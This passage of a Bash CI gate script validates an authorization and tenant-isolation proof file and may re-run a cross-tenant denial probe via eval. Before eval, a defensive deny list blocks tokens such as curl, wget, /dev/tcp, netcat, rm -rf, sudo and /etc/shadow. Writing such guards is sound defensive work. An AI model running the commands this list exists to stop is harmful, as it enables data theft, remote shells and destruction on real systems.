  and (.controls.audit_log_ref | type == "string" and length > 0)
  and (.tests | type == "object")
  and (.tests.positive_authz_ref | type == "string" and length > 0)
  and (.tests.negative_authz_ref | type == "string" and length > 0)
  and (.tests.anonymous_denial_ref | type == "string" and length > 0)
  and (.tests.privilege_escalation_ref | type == "string" and length > 0)
  and (.tests.regression_command_ref | type == "string" and length > 0)
  and (.tenant_isolation | type == "object")
  and (.tenant_isolation.required | type == "boolean")
  and (.evidence_refs | type == "array" and length >= 1)
  and (.signoff | type == "object")
  and (.signoff.required == true)
  and (.signoff.owner | type == "string" and length > 0)
  and (.signoff.signoff_ref | type == "string" and length > 0)
' "$PROOF" >/dev/null; then
  write_report "FAIL" "authz-tenant.json missing required access-control fields"
  exit 2
fi

tenant_surface="$(jq -r '.applicability.tenant_surface' "$PROOF")"
tenant_required="$(jq -r '.tenant_isolation.required' "$PROOF")"
if [ "$tenant_surface" = "true" ]; then
  if [ "$tenant_required" != "true" ] || ! jq -e '
    (.tenant_isolation.tenant_key_ref | type == "string" and length > 0)
    and (.tenant_isolation.rls_or_policy_ref | type == "string" and length > 0)
    and (.tenant_isolation.cross_tenant_denial_ref | type == "string" and length > 0)
    and (.tenant_isolation.isolation_evidence_ref | type == "string" and length > 0)
  ' "$PROOF" >/dev/null; then
    write_report "FAIL" "tenant surface requires tenant-key, policy/RLS, cross-tenant denial, and isolation evidence"
    exit 2
  fi
fi

run_date="$(jq -r '.run_date' "$PROOF")"
if ! proof_epoch="$(date -u -j -f %F "$run_date" +%s 2>/dev/null)"; then
  if ! proof_epoch="$(date -u -d "$run_date" +%s 2>/dev/null)"; then
    proof_epoch=0
  fi
fi
now_epoch="$(date -u +%s)"
max_age_seconds=$((MAX_AGE_DAYS * 86400))
if [ "$proof_epoch" -le 0 ] || [ $((now_epoch - proof_epoch)) -gt "$max_age_seconds" ]; then
  details="$(jq -n --arg run_date "$run_date" --argjson max_age_days "$MAX_AGE_DAYS" '{run_date:$run_date, max_age_days:$max_age_days}')"
  write_report "FAIL" "authz tenant proof is stale or invalid" "$details"
  exit 2
fi

refs="$(jq -r '
  [
    .controls.role_permission_matrix_ref,
    .controls.fail_closed_ref,
    .controls.least_privilege_ref,
    .controls.session_policy_ref,
    .controls.token_policy_ref,
    .controls.admin_boundary_ref,
    .controls.audit_log_ref,
    .tests.positive_authz_ref,
    .tests.negative_authz_ref,
    .tests.anonymous_denial_ref,
    .tests.privilege_escalation_ref,
    .tests.regression_command_ref,
    .tenant_isolation.tenant_key_ref,
    .tenant_isolation.rls_or_policy_ref,
    .tenant_isolation.cross_tenant_denial_ref,
    .tenant_isolation.isolation_evidence_ref,
    .signoff.signoff_ref,
    (.evidence_refs[]?)
  ] | map(select(type == "string")) | unique | .[]
' "$PROOF")"

missing_refs=""
unsafe_refs=""
while IFS= read -r ref; do
  [ -n "$ref" ] || continue
  case "$ref" in
    /*|*..*)
      unsafe_refs="${unsafe_refs}${ref}
"
      continue
      ;;
  esac
  if [ ! -s "$ROOT/$ref" ]; then
    missing_refs="${missing_refs}${ref}
"
  fi
done <<EOF
$refs
EOF

if [ -n "$unsafe_refs" ]; then
  details="$(printf '%s\n' "$unsafe_refs" | jq -R -s 'split("\n") | map(select(length > 0)) | {unsafe_refs:.}')"
  write_report "FAIL" "authz tenant proof has unsafe refs" "$details"
  exit 2
fi

if [ -n "$missing_refs" ]; then
  details="$(printf '%s\n' "$missing_refs" | jq -R -s 'split("\n") | map(select(length > 0)) | {missing_or_empty_refs:.}')"
  write_report "FAIL" "authz tenant proof refs are missing or empty" "$details"
  exit 2
fi

# ── EXECUTE PROBE — OBSERVE the cross-tenant denial; do not merely read a ref ────────────────────
# The audit's #1 fix (verdict-reader -> executor): a tenant surface may carry a re-runnable
# tenant_isolation.cross_tenant_probe = {command, expect_exit}. The command is RE-RUN here and its exit
# code OBSERVED. With WALTEUR_AUTHZ_TENANT_EXEC=1 a tenant surface MUST carry one (shape-only proof
# rejected). Reuses the ship-gate injection guard: allowlisted runner + dangerous-token refusal.
probe_cmd="$(jq -r '.tenant_isolation.cross_tenant_probe.command // ""' "$PROOF" 2>/dev/null)"
probe_expect="$(jq -r '.tenant_isolation.cross_tenant_probe.expect_exit // 0' "$PROOF" 2>/dev/null)"
if [ "$tenant_surface" = "true" ] && [ "${WALTEUR_AUTHZ_TENANT_EXEC:-0}" = "1" ] && [ -z "$probe_cmd" ]; then
  write_report "FAIL" "WALTEUR_AUTHZ_TENANT_EXEC=1: tenant surface requires tenant_isolation.cross_tenant_probe.command (execution-backed denial), not a ref-only proof"
  exit 2
fi
if [ -n "$probe_cmd" ]; then
  # Reject a TRIVIAL no-op probe (independent audit S008: command:"true" passed and proved nothing).
  # Scope (honest): the gate rejects the decidable bare no-op constants; that an arbitrary command truly
  # exercises the claimed control is undecidable here — that is the negative-control discipline's job.
  probe_trim="$(printf '%s' "$probe_cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')"
  # AUTHORITATIVE CHECK — shared guard closes the constant-exit / no-op probe CLASS (independent-panel
  # hole: the per-file regex only blocked the literal `bash -c 'exit 0'`, slipping `bash -lc 'exit 0'`,
  # trailing `;`, comments, and node/python no-op bodies). probe_proves_something requires the probe to
  # invoke a recognized test runner OR name a real on-disk artifact; a no-op/constant proves nothing.
  # FAIL CLOSED: if the guard file was absent at source time the function is undefined — refuse to run the
  # probe rather than silently skip the unprovable-probe check.
  if ! command -v probe_proves_something >/dev/null 2>&1; then
    write_report "FAIL" "shared probe guard (_probe-proof.sh) unavailable — cannot prove cross_tenant_probe is non-trivial; failing closed"
    echo "authz-tenant-gate verdict: FAIL - probe guard unavailable (fail-closed) -> $REPORT" >&2; exit 2
  fi
  if ! probe_proves_something "$probe_trim"; then
    write_report "FAIL" "cross_tenant_probe.command references no real test artifact/runner — it cannot prove the control (no-op/constant probe)"
    echo "authz-tenant-gate verdict: FAIL - unprovable/no-op probe -> $REPORT" >&2; exit 2
  fi
  # Pre-existing bare-constant fast-reject (harmless/redundant now that the shared guard is authoritative).
  case "$probe_trim" in
    true|false|:|/bin/true|/usr/bin/true|/bin/false|/usr/bin/false)
      write_report "FAIL" "cross_tenant_probe is a trivial no-op ($probe_trim) — it must run a REAL test, not a constant that passes by doing nothing"
      echo "authz-tenant-gate verdict: FAIL - trivial no-op probe -> $REPORT" >&2; exit 2 ;;
  esac
  # CONSTANT-EXIT WRAPPER rejection (independent audit follow-up to S008): a bare-constant check is not
  # enough — a wrapper like  bash -c 'exit 0'  (or sh -c 'true' / bash -c ':' / a bare 'exit 0') slips the
  # case above (bash/sh are allowlisted runners) yet proves NOTHING while passing. Reject (case-insensitive,
  # tolerant of surrounding quotes/whitespace) any probe that is only: optional-path (bash|sh) -c <body>
  # where <body> is one of { exit <digits> | true | false | : }, OR a bare 'exit <digits>'.
  if printf '%s' "$probe_trim" | grep -Eiq "^([[:alnum:]_./-]*/)?(bash|sh)[[:space:]]+-c[[:space:]]+['\"]?[[:space:]]*(exit[[:space:]]+[0-9]+|true|false|:)[[:space:]]*['\"]?$|^exit[[:space:]]+[0-9]+$"; then
    write_report "FAIL" "cross_tenant_probe is a constant-exit wrapper ($probe_trim) — it must run a REAL test, not a constant that passes by doing nothing"
    echo "authz-tenant-gate verdict: FAIL - constant-exit wrapper probe -> $REPORT" >&2; exit 2
  fi
  probe_first="$(printf '%s' "$probe_cmd" | awk '{print $1}')"
  case "$probe_first" in
    true|false|:|npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tox|uv|go|cargo|make|just|task|bash|sh|jest|vitest|mocha|rspec|rake|phpunit|composer|dotnet|mvn|gradle|./gradlew|ctest|cmake) : ;;
    *) write_report "FAIL" "cross_tenant_probe runner '$probe_first' is not an allowlisted test runner (injection guard)"; exit 2 ;;
  esac
  if printf '%s' "$probe_cmd" | grep -Eqi 'curl|wget|/dev/tcp|base64|netcat|ncat|rm[[:space:]]+-rf|sudo|mkfs|[[:space:]]dd[[:space:]]|ssh[[:space:]]|scp[[:space:]]|\$\(|`|/etc/(passwd|shadow)'; then
    write_report "FAIL" "cross_tenant_probe command contains a dangerous token; refusing to run"; exit 2
  fi
  ( cd "$ROOT" && eval "$probe_cmd" >/dev/null 2>&1 ); probe_rc=$?
  if [ "$probe_rc" != "$probe_expect" ]; then
    details="$(jq -n --arg c "$probe_cmd" --argjson got "$probe_rc" --argjson want "${probe_expect:-0}" '{probe:$c, exit:$got, expected:$want}')"
    write_report "FAIL" "cross-tenant denial probe EXECUTED and did NOT reproduce (exit $probe_rc != expected $probe_expect)" "$details"
    exit 2
  fi
  jq -n --arg v "PASS" --arg ts "$TS" --arg proof "${PROOF#"$ROOT"/}" --arg rd "$run_date" --arg c "$probe_cmd" \
    '{verdict:$v, ts:$ts, gate:"authz-tenant-gate", proof_file:$proof, reason:"authz tenant proof valid + cross-tenant denial OBSERVED by execution", run_date:$rd, tenant_surface:true, cross_tenant_probe_executed:$c, observed_exit:0}' \
    > "$REPORT" 2>/dev/null || write_report "PASS" "authz tenant proof valid + cross-tenant denial OBSERVED by execution"
  echo "authz-tenant-gate: PASS — cross-tenant denial OBSERVED by executing probe '$probe_cmd' (exit 0)" >&2
  exit 0
fi

details="$(jq -n --arg run_date "$run_date" --arg tenant_surface "$tenant_surface" '{run_date:$run_date, tenant_surface:($tenant_surface == "true")}')"
write_report "PASS" "authz tenant proof is valid" "$details"
exit 0
